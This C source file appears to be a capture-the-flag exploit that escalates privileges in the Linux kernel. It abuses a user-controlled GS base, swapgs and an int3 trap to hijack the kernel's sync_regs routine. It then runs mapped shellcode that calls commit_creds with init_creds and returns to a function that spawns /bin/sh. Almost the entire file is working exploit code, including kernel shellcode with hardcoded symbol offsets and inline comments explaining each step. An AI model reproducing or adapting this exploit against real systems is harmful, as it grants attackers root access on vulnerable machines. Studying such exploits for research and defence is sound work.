#define _GNU_SOURCE
#include <asm/prctl.h>
#include <asm/ptrace.h>
#include <ctype.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

void panic(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

long arch_prctl(int op, void *addr)
{
    return syscall(SYS_arch_prctl, op, addr);
}

void storeGDT(void *buf)
{
    __asm__("sgdt [rdi]");
}

void win(void)
{
    system("/bin/sh");
}

void __attribute__((naked)) SHELLCODE()
{
    __asm__ volatile(
        "swapgs\n\t"
        "movabs r8, 0xfffffe0000000004\n\t"
        "mov r8, [r8]\n\t"
        "sub r8, 0x808e00\n\t"
        "mov r9, r8\n\t"
        "add r9, 0x9b430\n\t" // commit_creds
        "mov rdi, r8\n\t"
        "add rdi, 0xe38d40\n\t" // init_creds
        "call r9\n\t"
        "swapgs\n\t"
        "push 0x2b\n\t"
        "push 0x1338008\n\t"
        "push 0x206\n\t"
        "push 0x33\n\t"
        "push 0x4017da\n\t"
        "iretq");
}

int main(void)
{
    void *shellcode;
    setbuf(stdout, NULL);

    shellcode = mmap((void *)0x1337000ULL, 0x30000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON | MAP_FIXED_NOREPLACE | MAP_POPULATE, -1, 0);
    if (shellcode == MAP_FAILED)
        panic("mmap");

    memset(shellcode, '\x90', 0x1000);
    memcpy(shellcode, SHELLCODE, 0x100);

    printf("stack: %p\n", shellcode);

    arch_prctl(ARCH_SET_GS, shellcode);

    char buf[0x10];
    uint64_t gdt;
    storeGDT(buf);
    gdt = *(uint64_t *)(buf + 2);

    printf("gdt: 0x%lx\n", gdt);

    /*
    asmlinkage __visible noinstr struct pt_regs *sync_regs(struct pt_regs *eregs)
    {
            struct pt_regs *regs = (struct pt_regs *)current_top_of_stack() - 1;
            if (regs != eregs)
                *regs = *eregs;
            return regs;
    }

     Check sync_regs -> current_top_of_stack() is at gs:0x21458;
     gdt -> kernel stack
     gdt+0x1f50 -> rsp of `sync_regs` function
     error_entry:
        lea rdi, [rsp+8]
        jmp sync_regs


    */

    *(uint64_t *)(shellcode + 0x21458) = gdt + 0x1f50 + sizeof(struct pt_regs);
    /*                                        `sync_regs` rsp + size struct pt_regs*/
    /*
        eregs -> rsp+8
        regs -> rsp

        regs->r15 = eregs->r15 ====> `sync_regs` return address = eregs->r15
    */

    __asm__("swapgs"); // error_entry will call swapgs again -> back to our gs

    __asm__(
        "mov rax, 1\n"
        "mov rbx, 2\n"
        "mov rcx, 3\n"
        "mov rdx, 4\n"
        "mov rsp, 5\n"
        "mov rbp, 6\n"
        "mov rsi, 7\n"
        "mov rdi, 8\n"
        "mov r8, 9\n"
        "mov r9, 10\n"
        "mov r10, 11\n"
        "mov r11, 12\n"
        "mov r12, 13\n"
        "mov r13, 14\n"
        "mov r14, 15\n"
        "mov r15, 0x1337000\n");

    __asm__("int 0x3"); // trigger asm_exc_int3 -> error_entry -> dump pt_regs to stack

    return 0;
}